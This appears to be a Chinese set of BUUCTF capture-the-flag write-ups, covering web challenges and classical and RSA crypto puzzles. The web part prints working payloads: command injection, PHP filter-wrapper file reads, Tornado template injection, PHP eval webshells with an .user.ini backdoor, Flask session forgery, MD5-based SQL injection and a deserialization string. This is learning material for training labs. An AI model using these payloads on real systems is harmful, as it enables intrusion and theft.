# Web

## [CISCN2019 华东北赛区]Web2

https://blog.csdn.net/fdl3183566040/article/details/109011704



## [极客大挑战 2019]Secret File

### 考点：文件包含

这道题还是很简单的，我们审计页面源码发现有一个隐藏在页面里的链接

![BUUCTF Secret File1](images/BUUCTF%20web.assets/BUUCTF%20Secret%20File1.png)

点击进入，发现页面提示我们“查阅结束”，我们抓个包看一下，发现提示一个网页：secr3t.php

![BUUCTF Secret File2](images/BUUCTF%20web.assets/BUUCTF%20Secret%20File2.png)

进入后发现是源码

![BUUCTF Secret File3](images/BUUCTF%20web.assets/BUUCTF%20Secret%20File3.png)

有一个过滤，过滤了‘’../“，tp，input，data，字符串

```php
if(strstr($file,"../")||stristr($file, "tp")||stristr($file,"input")||stristr($file,"data"))
```

我们伪协议用base64读一下

```
buuoj.cn/secr3t.php?file=php://filter/read=convert.base64-encode/resource=flag.php
```

![BUUCTF Secret File4](images/BUUCTF%20web.assets/BUUCTF%20Secret%20File4.png)



## [ACTF2020 新生赛]Exec

### 考点：命令执行

post传参，构造payload：

```
target=127.0.0.1 || ls
target=127.0.0.1 || cd /; ls
target=127.0.0.1 || cat /flag
```



## [护网杯 2018]easy_tornado

### 考点：SSTI模板注入

进入题目发现三个文件：

- 第一个文件flag.txt，flag的提示文件名为`/fllllllllllag`
- 第二个welcome.txt中，我们发现提示有一个render，render({options}) 去向模板中渲染数据, 可以把视图响应给客户端，猜测存在模板注入
- 第三个hints.txt，提示md5(cookie_secret+md5(filename))，我们需要获得filename和cookie_secret，filename我们有理由猜测为`/fllllllllllag`，所以，下面的任务就是要找到cookie_secret了

进入后，查看/hints提示，我们去查一下这个cookie_secret是个什么东西

![easy_tornado1](images/BUUCTF%20web.assets/easy_tornado1.png)

查阅资料，发现 `secure cookie` 是Tornado 用于保护cookies安全的一种措施，`cookie_secret`保存在`settings`中。

其中发现`self.application.settings`有一个别名

> handler指向的处理当前这个页面的`RequestHandler`对象， `RequestHandler.settings`指向`self.application.settings`， 因此`handler.settings`指向`RequestHandler.application.settings`

因此我们可以试一下模板注入，发现指向了新页面，error页面

![easy_tornado2](images/BUUCTF%20web.assets/easy_tornado2.png)

所以我们的构造payload，就可以拿到cookie_secret了

```
error?msg={{handler.settings}}
```

![easy_tornado3](images/BUUCTF%20web.assets/easy_tornado3.png)

```
'cookie_secret': 'c2529434-eae5-445d-bf59-1bcb0cacb16e'
```

现在我们只需要继续完成剩下的MD5加密过程

```
'cookie_secret': c2529434-eae5-445d-bf59-1bcb0cacb16e
'filename': /fllllllllllllag

md5(cookie_secret+md5(filename))

filename_md5:3bf9f6cf685a6dd8defadabfb41a03a1
最后的MD5：66acf0dead35f8cb39b318705ccb0661
```

```
file?filename=/fllllllllllllag&filehash=66acf0dead35f8cb39b318705ccb0661
```

![easy_tornado4](images/BUUCTF%20web.assets/easy_tornado4.png)





## [极客大挑战 2019]Http

### 考点：



通过查看网页源代码，发现一个文件Secret.php

![BUUCTF Http1](images/BUUCTF.assets/BUUCTF%20Http1.png)

进入后发现，页面提示我们需要来自该网址：https://www.Sycsecret.com，直接改**header头**信息即可，我们可以通过使用**referer头**来修改

我们bp改包后，发现页面又有一个提示，要求我们使用**Syclover**浏览器进入，**这里直接修改UA头即可**

![BUUCTF[极客大挑战 2019]Http1](images/BUUCTF.assets/BUUCTF%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DHttp1.png)

页面继续提示，要求我们使用本地访问，这里就对XFF头进行伪造

![BUUCTF[极客大挑战 2019]Http2](images/BUUCTF.assets/BUUCTF%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DHttp2.png)

ok，拿到flag

![BUUCTF[极客大挑战 2019]Http3](images/BUUCTF.assets/BUUCTF%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DHttp3.png)





## [极客大挑战 2019]Upload

进入就是文件上传，我们直接传就好了，这里我们文件后缀使用：**phtml**，修改文件类型：**image/jpeg**

```
GIF89a?
<script language="php">eval($_REQUEST[x])</script>
```

访问：http://46f74b4e-872f-4b2e-af4a-c936d1ffb244.node3.buuoj.cn/upload/webshell.phtml

蚁剑连上就好了





## [ACTF2020 新生赛]Upload

同样的文件上传，我们直接传就好了，这里我们文件后缀依然使用：**phtml**，修改文件类型：**image/jpeg**

```
GIF89a?
<script language="php">eval($_REQUEST[x])</script>
```

访问：http://91d77da2-923b-4d93-83e3-5f6d5d5be7b1.node3.buuoj.cn/uplo4d/6bba837013452ad67f53ddce882b95ed.phtml

蚁剑连上就好了





## [HCTF 2018]admin

首先爬一遍整个网站，发现有没注册的时候有“login”,"register"这两个页面，我们注册一个123用户登录后发现有 "index“,”post“,”logout“，”change password“这四个界面，根据题目提示的admin，猜测我们需要登录admin用户。我们先放在后台跑一个爆破。

没想到，居然密码是123，emmmm

![img](https://img2018.cnblogs.com/blog/1697845/201910/1697845-20191022203159803-499098040.png)

但还是要尝试用正确的方式打开，看了wp，这里有三种方法



### 解法一：flask session伪造

在"change password"页面有提示

![img](https://img2018.cnblogs.com/blog/1697845/201910/1697845-20191022223422961-480807175.png)

进入查看源码时发现是用**flask**写的

> 由于 **flask** 是非常轻量级的 **Web框架** ，其 **session** 存储在客户端中（可以通过HTTP请求头Cookie字段的session获取），且仅对 **session** 进行了签名，缺少数据防篡改实现，这便很容易存在安全漏洞。



这里我们想要伪造session，就需要先了解一下flask中session是怎么构造的。

> flask中session是存储在客户端cookie中的，也就是存储在本地。flask仅仅对数据进行了签名。众所周知的是，签名的作用是防篡改，而无法防止被读取。而flask并没有提供加密操作，所以其session的全部内容都是可以在客户端读取的，这就可能造成一些安全问题。
> 具体可参考：
> https://xz.aliyun.com/t/3569
> https://www.leavesongs.com/PENETRATION/client-session-security.html#

我们可以通过大佬的脚本将session解密一下：

```python
import sys
import zlib
from base64 import b64decode
from flask.sessions import session_json_serializer
from itsdangerous import base64_decode

def decryption(payload):
    payload, sig = payload.rsplit(b'.', 1)
    payload, timestamp = payload.rsplit(b'.', 1)

    decompress = False
    if payload.startswith(b'.'):
        payload = payload[1:]
        decompress = True

    try:
        payload = base64_decode(payload)
    except Exception as e:
        raise Exception('Could not base64 decode the payload because of an exception')

    if decompress:
        try:
            payload = zlib.decompress(payload)
        except Exception as e:
            raise Exception('Could not zlib decompress the payload before decoding the payload')

    return session_json_serializer.loads(payload)

if __name__ == '__main__':
    print(decryption(sys.argv[1].encode()))
```

![img](https://img-blog.csdnimg.cn/20190911131458737.png)

但是如果我们想要加密伪造生成自己想要的session还需要知道SECRET_KEY，然后我们在config.py里发现了SECRET_KEY

```
SECRET_KEY = os.environ.get('SECRET_KEY') or 'ckj123'
```

![img](https://img2018.cnblogs.com/blog/1697845/201910/1697845-20191022234113782-665728522.png)

然后在index.html页面发现只要session[‘name’] == 'admin’即可以得到flag

于是我们找了一个flask session加密的脚本 https://github.com/noraj/flask-session-cookie-manager
利用刚刚得到的SECRET_KEY，在将解密出来的name改为admin，最后用脚本生成我们想要的session将之替换就好了



### 解法二：Unicode欺骗（预期解法）

- 既然有源码，重点肯定是在注册登录的验证处理和对数据库操作。
- 在 `index.html` 发现 当登录用户名为 `admin` 时 输出 flag

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200518153634487.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1RNXzEwMjQ=,size_16,color_FFFFFF,t_70)

这里我们尝试使用二次注入，也就是先注册一个账号和 `admin` 不同，成功注册后，登录在修改密码时，能修改 `admin` 的密码。

我们先在这个平台找字符：https://unicode-table.com/cn/sets/superscript-and-subscript-letters/

这里先注册一个账号 ：ᴬᴰᴹᴵᴺ，密码：123

> 这里的ᴬᴰᴹᴵᴺ就是我们要寻找的特殊字符

修改密码：111，然后退出

![img](https://img2018.cnblogs.com/blog/1697845/201910/1697845-20191023220511636-1755338111.png)

用账号”admin“,密码：111成功登录

![img](https://img2018.cnblogs.com/blog/1697845/201910/1697845-20191023220545823-1229410508.png)

大致的思路是：在注册的时候 ”ᴬᴰᴹᴵᴺ“ 经过strlower()，转成”ADMIN“ ， 在修改密码的时候 ”ADMIN“经过strlower()变成”admin“ , 当我们再次退出登录的时候 ”admin“经过strlower()变成”admin“(没啥卵用，但是你已经知道了一个密码已知的”admin“，而且在index.html中可以看到只要session['name']=='admin',也就是只要用户名是’admin‘就可成功登录了)





## [ACTF2020 新生赛]BackupFile

#### 考点：代码审计

题目提示“Try to find out source file!”，我们最后找到了index.php的备份文件——/index.php.bak

> 还可能是类似于www.zip、bak.zip之类的

```php
<?php
include_once "flag.php";

if(isset($_GET['key'])) {
    $key = $_GET['key'];
    if(!is_numeric($key)) {
        exit("Just num!");
    }
    $key = intval($key);
    $str = "123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3";
    if($key == $str) {
        echo $flag;
    }
}
else {
    echo "Try to find out source file!";
}
```

代码很简单，我们的Key**必须为数字**且**等于123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3**这一字符串

感觉是考PHP的弱类型特性，int和string是无法直接比较的，php会将string转换成int然后再进行比较，转换成int比较时只保留数字，第一个字符串之后的所有内容会被截掉

**所以相当于key只要等于123就满足条件了**

![BUUCTF_BackupFile](images/BUUCTF.assets/BUUCTF_BackupFile.png)





## [极客大挑战 2019]BuyFlag

#### 考点：代码审计

题目右侧菜单栏有payflag

![BUUCTF_BuyFlag1](images/BUUCTF.assets/BUUCTF_BuyFlag1.png)

打开查看页面及源代码

![BUUCTF_BuyFlag2](images/BUUCTF.assets/BUUCTF_BuyFlag2.png)

```php
<!--
    ~~~post money and password~~~
if (isset($_POST['password'])) {
    $password = $_POST['password'];
    if (is_numeric($password)) {
        echo "password can't be number</br>";
    }elseif ($password == 404) {
        echo "Password Right!</br>";
    }
}
-->
```

根据这些信息分析，我们得到：

- password要等于404才有权限购买
- 金钱要等于100000000

首先有个问题404是数值is_numeric函数会检测出来所以我们得绕过它，这里可以用截断，随便什么都好

比如：|，；，%20什么的

还有，这个包里面cookie的值有个user=0 CTF直觉这肯定要改成1的 因为正常情况下这里是cookie的值 所以我们用bp测试

最后这个money是用strcmp的函数验证了长度，我们利用特性绕过它，money后面加[]绕过  即可得到flag

![BUUCTF_BuyFlag3](images/BUUCTF.assets/BUUCTF_BuyFlag3.png)





## [SUCTF 2019]CheckIn

#### 考点：文件上传

先上传一个一句话木马，文件名webshell.jpg

```
GIF89a?
<script language="php">@eval($_REQUEST['x']);</script>
```

再上传.user.ini文件，文件内容：

```
auto_prepend_file=webshell.jpg
```

> 形成后门原理就是会在执行所有的php文件之前包含.user.ini所指定的文件

这里的条件：

- 1、服务器脚本语言为PHP 
- 2、服务器使用CGI／FastCGI模式
- 3、上传目录下要有可执行的php文件

再用蚁剑连接

```
http://0619ccaf-57a0-45a8-9799-c6c96e0cbac3.node3.buuoj.cn/uploads/852aff287f54bca0ed7757a702913e50/index.php
```





## [BJDCTF2020]Easy MD5

### 考点：MD5绕过

参考：https://www.jianshu.com/p/12125291f50d

**ffifdyop**：这个点的原理是 ffifdyop 这个字符串被 md5 哈希了之后会变成 276f722736c95d99e921722cf9ed621c，这个字符串前几位刚好是 ‘ or ‘6，
而 Mysql 刚好又会吧 hex 转成 ascii 解释，因此拼接之后的形式是1select * from 'admin' where password='' or '6xxxxx'

等价于 or 一个永真式，因此相当于万能密码，可以绕过md5()函数

password='".md5($pass,true)."'

#### 第一步，输入ffifdyop

得到了下一个的地址：levels91.php

![BUUCTF[BJDCTF2020]Easy MD5 1](images/BUUCTF.assets/BUUCTF%5BBJDCTF2020%5DEasy%20MD5%201.png)

#### 第二步，数组绕过

查看源码，发现提示

![BUUCTF[BJDCTF2020]Easy MD5 2](images/BUUCTF.assets/BUUCTF%5BBJDCTF2020%5DEasy%20MD5%202.png)

```
$a = $GET['a'];
$b = $_GET['b'];

if($a != $b && md5($a) == md5($b)){
    // wow, glzjin wants a girl friend.
```

这里我们数组绕过，得到下一个的地址levell14.php

```
?a[]=1&b[]=2
```

![BUUCTF[BJDCTF2020]Easy MD5 3](images/BUUCTF.assets/BUUCTF%5BBJDCTF2020%5DEasy%20MD5%203.png)

#### 第三步，代码审计

进入就是代码审计了

```
<?php
error_reporting(0);
include "flag.php";

highlight_file(__FILE__);

if($_POST['param1']!==$_POST['param2']&&md5($_POST['param1'])===md5($_POST['param2'])){
    echo $flag;
}
```

一样的数组绕过

```
param1[]=1&param2[]=2
```

![BUUCTF[BJDCTF2020]Easy MD5 4](images/BUUCTF.assets/BUUCTF%5BBJDCTF2020%5DEasy%20MD5%204.png)





## [ZJCTF 2019]NiZhuanSiWei

### 考点：php伪协议+php反序列化

题目给了源码，我们查看一下

```php
 <?php  
$text = $_GET["text"];
$file = $_GET["file"];
$password = $_GET["password"];
if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/",$file)){
        echo "Not now!";
        exit(); 
    }else{
        include($file);  //useless.php
        $password = unserialize($password);
        echo $password;
    }
}
else{
    highlight_file(__FILE__);
}
?> 
```

#### 第一步

首先就是需要让$text等于：”welcome to the zjctf“ 

这里可以用php://input伪协议在以POST形式传入“ welcome to the zjctf "  也可以用data伪协议传参

```
?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=
```

#### 第二步

直接正则过滤掉flag关键字，提示一个useless.php，于是我们用php://filter协议来读取

结合题目构造payload

```
?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&file=php://filter/read=convert.base64-encode/resource=useless.php
```

#### 第三步

用base64解码获得useless.php的源码

```php
<?php  
class Flag{  //flag.php  
    public $file;  
    public function __tostring(){  
        if(isset($this->file)){  
            echo file_get_contents($this->file); 
            echo "<br>";
        return ("U R SO CLOSE !///COME ON PLZ");
        }  
    }  
}  
?>
```

这里就是php反序列化了，我们到在线php平台构造一下

```php
<?php  
class Flag{
    public $file='flag.php';  
    public function __tostring(){  
        if(isset($this->file)){  
            echo file_get_contents($this->file); 
            echo "<br>";
        return ("U R SO CLOSE !///COME ON PLZ");
        }  
    }  
} 
$password=new Flag();
$password = serialize($password);
echo $password; 
?>
//得到：O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
```

最后的payload，flag再注释里

```
?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&file=useless.php&password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
```





## [CISCN2019 华北赛区 Day2 Web1]Hack World



























































# Crypto

## MD5

因为md5是一种类似于有损压缩的加密算法，所以没有可以直接解密的算法。
 只能去撞库

`https://md5.gromweb.com/?md5=e00cf25ad42683b3df678c61f42c6bda`

上面密码解密为**admin1**



## 看我回旋踢

看到直接凯撒就完事了



## password

讲道理，拿到题目的时候一时半会还不知道这个是什么意思，看了别人的wp才知道考的是简单的**弱密码**

姓名缩写+生日就是flag了



## 变异凯撒

看到题目就知道和凯撒密码有关，但并不简单，而我们知道凯撒加密的原理为：

**凯撒加密法，或称恺撒加密、恺撒变换、变换加密，是一种最简单且最广为人知的加密技术。它是一种替换加密的技术，明文中的所有字母都在字母表上向后（或向前）按照一个固定数目进行偏移后被替换成密文。**

上面的结果中没有答案，这时我们再去看题目，变异的凯撒，凯撒加密与移动位数相关，那么变异可能就变在**移动**上了。而密文中有“_”,这个符号在字母表中是没有的，所以想到，可能是**ASCII码值得变动**。



> 密文：afZ_r9VYfScOeO_UL^RWUc，看看能否与ctf 或者flag 对应上，
>
> 此时发现 a:97  f:102  Z:106   _:95                                                              
>
> 而      c:99  t:116   f:102   {:123
>
> ​        f:102  l:108  a:97   g:103
>
> a→f： 移动了5  f→l：移动了6， 后面依次移动了7、8。此时按照这种移动规律，去写代码



```python
# coding:utf-8


def b_kaisa(mstr):
    j = 5
    i = 0
    lmstr = ''
    for i in range(len(mstr)):
        m = ord(mstr[i])          # 将密文的第i个字母变为其ascii码值
        m = m + j                 # ascii值+j
        m = chr(m)                # 将ascii转换为字符串
        lmstr += m                # 将递进后的ascii值存入字符串lmstr
        i = i+1
        j = j+1
    return lmstr


if __name__ == '__main__':
    m_str = 'afZ_r9VYfScOeO_UL^RWUc'    # 密文
    lstr = b_kaisa(m_str)
    print(lstr)
```

最后就可以看到flag了



## Quoted-printable

首先介绍一下这种编码：

它是**多用途互联网邮件扩展**（MIME) 一种实现方式。其中MIME是一个互联网标准，它扩展了电子邮件标准，致力于使其能够支持非ASCII字符、二进制格式附件等多种格式的邮件消息。目前http协议中，很多采用MIME框架！quoted-printable 就是说用一些可打印常用字符，表示一个字节（8位）中所有非打印字符方法！

[Quoted-printable在线解码](http://web.chacuo.net/charsetquotedprintable)





## Rabbit

[Rabbit在线解码](https://www.sojson.com/encrypt_rabbit.html)



## 篱笆墙的影子

栅栏加密



## RSA

直接拿**RSATool2v17.exe**解就是了，注意e的值要转成16进制



## 丢失的MD5

直接在我们的环境下是不能执行的，因此要补上一点东西，根据题目所给信息写python脚本

```python
import hashlib
for i in range(32,127):
    for j in range(32,127):
        for k in range(32,127):
            m=hashlib.md5()
            m.update('TASC'.encode('utf-8')+chr(i).encode('utf-8')+'O3RJMV'.encode('utf-8')+chr(j).encode('utf-8')+'WDJKX'.encode('utf-8')+chr(k).encode('utf-8')+'ZM'.encode('utf-8'))
            des=m.hexdigest()
            if 'e9032' in des and 'da' in des and '911513' in des:
                print (des)
```

我们需要一个编码格式：.encode('utf-8')，运行结果就是falg了



## 老文盲了

直接扔到谷歌翻译，让谷歌给我们读出来

得到flag: BJD{淛匶襫黼瀬鎶軄鶛驕鳓哵}



## Alice与Bob

我们首先根据题目要求进行分解

```
yafu-x64.exe factor(98554799767)
```

> P6 = 966233
> P6 = 101999

分解后组合得到：101999966233，再加密就好了

[MD5加密](https://www.qqxiuzi.cn/bianma/md5.htm)



## rsarsa

直接python写一个脚本就好了

```python
def getEuler(prime1, prime2):
    return (prime1 - 1) * (prime2 - 1)

# 19d - 920071380k= 1
# 求私钥d
def getDkey(e, Eulervalue):  # 可以辗转相除法
    k = 1
    while True:
        if (((Eulervalue * k) + 1) % e) == 0:
            (d, m) = divmod(Eulervalue * k + 1, e)
            return d  # 避免科学计数法最后转int失去精度
        k += 1


# 求明文
def Ming(c, d, n):
    return pow(c, d, n)


if __name__ == '__main__':
    p = 9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483
    q = 11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407
    d = getDkey(65537, getEuler(p, q))
    print('私钥为： %d' % d)
    c = 83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034
    n = p * q
    print('明文如下： ')
    print(Ming(c, d, n))
```



## 大帝的密码武器

数一下，我们将题目中给的字符串`FRPHEVGL`经行1-26的移位观察，发现偏移量为13时，为有意义单词

写个脚本吧，将密文里面的`ComeChina`做偏移量为13的偏移：然后如果超出`z`，减26使其回到`A-z`范围内（别问我为什么，因为不减的结果`P|zrPuv{n`经过我的验证是不对的），最终得到`PbzrPuvan`，用花括号包起来就可以提交了`flag{PbzrPuvan}`

```python
str = 'ComeChina'


for temp in str:
    if(ord(temp)+13 > ord('z')):        # 这里的偏移量为13
        print(chr(ord(temp)+13-26),end = '')
    else:
        print(chr(ord(temp)+13),end = '')
print('')
```



## Windows系统密码

拿到后拿记事本打开，发现是个文本，尝试用MD5进行解题

最后尝试出，用这段就可以解出flag了

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200503150332198.png)



### cat_flag

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200513153615301.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L01pa2VDb2tl,size_16,color_FFFFFF,t_70)

图中只有两种小猫，一只有鸡腿，一只没有鸡腿。很容易想到二进制数0，1。将图片用二进制表示为：

> 01000010
> 01001010
> 01000100
> 01111011
> 01001101
> 00100001
> 01100001
> 00110000
> 01111110
> 01111101

将二进制数转为16进制，再16进制转文本。
得到flag为： BJD{M!a0~}



## 燕言燕语-y1ng

> 79616E7A69205A4A517B78696C7A765F6971737375686F635F73757A6A677D20

首先进行16进制转字符串

> yanzi ZJQ{xilzv_iqssuhoc_suzjg} 

`ZJQ BJD` 这二者的对应关系应该算是提示，于是手算了一下，很容易发现，Z 往前移动 24 个位置得到 B，而 J 的位置没移动，Q 向前移动 13 个位置得到 D。而 24、0、13 的位置编号刚好对应当 A 为 0 时的字母编号

这其实是个**维吉尼亚密码**

[维吉尼亚密码在线解码&加密方式](https://www.qqxiuzi.cn/bianma/weijiniyamima.php)

yanzi作为密钥，是维吉尼亚密码，经过解码得到：**BJD{yanzi_jiushige_shabi}**



## 传统知识+古典密码

我们先找到天干地支表，我们都知道一轮天干地支为60年，于是猜测与ASCII码有关

|  1   |  2   |  3   |  4   |  5   |  6   |  7   |  8   |  9   |  10  |
| :--: | :--: | :--: | :--: | :--: | :--: | :--: | :--: | :--: | :--: |
| 甲子 | 乙丑 | 丙寅 | 丁卯 | 戊辰 | 己巳 | 庚午 | 辛未 | 壬申 | 癸酉 |
|  11  |  12  |  13  |  14  |  15  |  16  |  17  |  18  |  19  |  20  |
| 甲戌 | 乙亥 | 丙子 | 丁丑 | 戊寅 | 己卯 | 庚辰 | 辛巳 | 壬午 | 癸未 |
|  21  |  22  |  23  |  24  |  25  |  26  |  27  |  28  |  29  |  30  |
| 甲申 | 乙酉 | 丙戌 | 丁亥 | 戊子 | 己丑 | 庚寅 | 辛卯 | 壬辰 | 癸巳 |
|  31  |  32  |  33  |  34  |  35  |  36  |  37  |  38  |  39  |  40  |
| 甲午 | 乙未 | 丙申 | 丁酉 | 戊戌 | 己亥 | 庚子 | 辛丑 | 壬寅 | 癸卯 |
|  41  |  42  |  43  |  44  |  45  |  46  |  47  |  48  |  49  |  50  |
| 甲辰 | 乙巳 | 丙午 | 丁未 | 戊申 | 己酉 | 庚戌 | 辛亥 | 壬子 | 癸丑 |
|  51  |  52  |  53  |  54  |  55  |  56  |  57  |  58  |  59  |  60  |
| 甲寅 | 乙卯 | 丙辰 | 丁巳 | 戊午 | 己未 | 庚申 | 辛酉 | 壬戌 | 癸亥 |

按照给的天干地支，查到分别对应，又因为要提示**”+甲子“**，于是再加上一轮60

> 辛卯，癸巳，丙戌，辛未，庚辰，癸酉，己卯，癸巳
>
> 28，30，23，08，17，10，16，30
>
> 88，90，83，68，77，70，76，90

我们将其转为ascii码，得到：XZSDMFLZ，又题目中说有古典密码，则想到栅栏加密，凯撒加密

栅栏解密后得到：

> 第1栏：XSMLZDFZ
> 第2栏：XMZFSLDZ

分别用凯撒解密，其中第二组得到解密得到flag

> SHUANGYU  得到拼音：双鱼



## 小学生的密码学

这里考查的是：**仿射密码**

**仿射密码**是一种替换密码。它是一个字母对一个字母的。它的加密函数是

![img](https://bkimg.cdn.bcebos.com/formula/e4740660d919145d58019a70ae54b90b.svg)

，其中a和m[互质](https://baike.baidu.com/item/互质)，m是字母的数目。解码函数是

![img](https://bkimg.cdn.bcebos.com/formula/b4f3ea1c6819c357b7f90c78733696f5.svg)

[仿射密码解密](http://www.atoolbox.net/Tool.php?Id=911)

最后得到：sorcery，再按题目意思进行base64加密就好了



## 信息化时代的步伐

这里给的是**“中文电报”**，[中文电报查询](http://code.mcdvisa.com/)



## RSA1

这里题目没有给我们密钥e值，写个脚本吧

```python
# 不给密钥e值
import gmpy2
import binascii


def decrypt(dp,dq,p,q,c):
    InvQ = gmpy2.invert(q,p)
    mp = pow(c,dp,p)
    mq = pow(c,dq,q)
    m=(((mp-mq)*InvQ)%p)*q+mq
    print (binascii.unhexlify(hex(m)[2:]))


p = 8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229
q = 12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469
dp = 6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929
dq = 783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041
c = 24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852

decrypt(dp,dq,p,q,c)
```



## 凯撒？替换？呵呵!

以为是简单的凯撒加密，但是分析Ascill表，发现毫无规律，意味着要爆破出所有可能。只能用在线工具来弄了

[quipqiup](https://www.quipqiup.com/)

![在这里插入图片描述](https://img-blog.csdnimg.cn/20191117141930217.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lJSEFIVUhB,size_16,color_FFFFFF,t_70)

最后得到第一个

>  FLAG{ SUBSTITUTION CIPHER DECRYPTION IS ALWAYS EASY JUST LIKE A PIECE OF CAKE}

我们还要转成小写，去空格，[英文字母大小写转换](https://www.iamwawa.cn/daxiaoxie.html)



## 权限获得第一步

得到这样一串字符：

> **Administrator:500:806EDC27AA52E314AAD3B435B51404EE:F4AD50F57683D4260DFD48AA351A17A8:::**

将**F4AD50F57683D4260DFD48AA351A17A8**用[MD5解密](https://cmd5.com/)

得到flag为flag{3617656}



## old-fashion

打开压缩包得到文本

词频分析，替换密码，用[爆破工具](https://quipqiup.com/)

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200513164728330.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L01pa2VDb2tl,size_16,color_FFFFFF,t_70)

得到flag:
flag{n1_2hen-d3_hu1-mi-ma_a}



## Y1nglish-y1ng

同样进行词频分析，替换密码，用[爆破工具](https://quipqiup.com/)



## 世上无难事

注意题目给的关键词：
1.找到key作为答案提交
2.答案是32位
3.包含小写字母

这是替换密码，直接用[爆破工具](https://quipqiup.com/)

将 PIO 替换为 key

转为小写，得到flag:
flag{640e11012805f211b0ab24ff02a1ed09}



## 异性相吸

winhex看一看，就差不多是异或就好了，写个脚本

```python
a = '0110000101110011011000010110010001110011011000010111001101100100011000010111001101100100011000010111001101100100011000010111001101100100011000010111001101100100011000010111001101100100011000010111001101100100011000010111001101100100011000010111001101100100011100010111011101100101011100110111000101100110'
b = '0000011100011111000000000000001100001000000001000001001001010101000000110001000001010100010110000100101101011100010110000100101001010110010100110100010001010010000000110100010000000010010110000100011000000110010101000100011100000101010101100100011101010111010001000001001001011101010010100001010000011011'
c = ''

for i in range(len(a)):  # 异或
    if (a[i] == b[i]):
        c += '0'
    else:
        c += '1'

flag = ''  # 二进制转换为字符串
for i in range(int(len(c) / 8)):
    flag += chr(int(c[i * 8:(i + 1) * 8], 2))

print(flag)
```





## RSA

[RSA参考答案](https://www.cnblogs.com/harmonica11/p/11504291.html)



## 还原大师

拿到这个后，采用MD5爆破

```python
import hashlib

c = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
a = 'E903???4DAB????08?????51?80??8A?'  # 判断用的元素
flag = 0


def f(mds):
    for i in range(0, len(a)):
        if a[i] == '?':
            continue
        elif a[i] != mds[i]:
            return 0
    return 1


for i in range(0, len(c)):
    if flag == 1:
        break
    for j in range(0, len(c)):
        for k in range(0, len(c)):
            b = 'TASC' + c[i] + 'O3RJMV' + c[j] + 'WDJKX' + c[k] + 'ZM'     # 要还原的明文
            md = hashlib.md5(b.encode('utf8'))
            mds = md.hexdigest().upper()        # 注意大小写
            flag = f(mds)
            if flag == 1:
                print(mds)
```



## 汉字的秘密

### 考点：当铺密码

笔画中有几个出头的就对应着数字几。例如：

> 田：0	由：1	王：6	壮：9

```python
dh = '田口由中人工大土士王夫井羊壮'
ds = '00123455567899'

cip = '王壮 夫工 王中 王夫 由由井 井人 夫中 夫夫 井王 土土 夫由 土夫 井中 士夫 王工 王人 土由 由口夫'
s = ''
for i in cip:
	if i in dh:
		s += ds[dh.index(i)]
	else:
		s += ' '
#print(s)

ll = s.split(" ")
t = ''
for i in range(0,len(ll)):
	t += chr(int(ll[i])+i+1)
print('t=', t, '\t\tt.lower()=', t.lower())
```



## robomunication

给了一个MP3文件，听后猜测是摩斯密码

听到的都是“bi”或者“bu”，这里用b代表“bi”，“p”代表“bu”

> bbbb b bpbb bpbb ppp bpp bbbb bp p
>
> bb bbb p bbbb b pbp b pbpp bb p bb bbb (p b bb) ppp ppp bppb pbbb b b bppb

打括号那里显得较分散一开始是分开来记得，最后分析还是这四个与其他之间的间隔较明显，所以把括号里的四个算成一个

因为音频里“bi”的声音比“bu”长，所以我觉得“bi”可能代表“—”，“bu”代表“![\cdot](https://private.codecogs.com/gif.latex?%5Cdpi%7B150%7D%20%5Ccdot)”

最后提交的flag是：BOOPBEEP



## RSA Roll

[RSA Roll解题](https://www.52pojie.cn/forum.php?mod=viewthread&tid=490769&page=1&authorid=504980)



## Cipher

然后其实题目还是给出了提示：“公平” ，公平的英文是fair，联想到经典密码：**playfair密码（普莱费尔密码）**

密钥是playfair，就很坑

[普莱费尔密码加密/解密](http://www.atoolbox.net/Tool.php?Id=912)



## Unencode

> 89FQA9WMD<V1A<V1S83DY.#<W3$Q,2TM]

[UUencode解码](http://ctf.ssleye.com/uu.html)

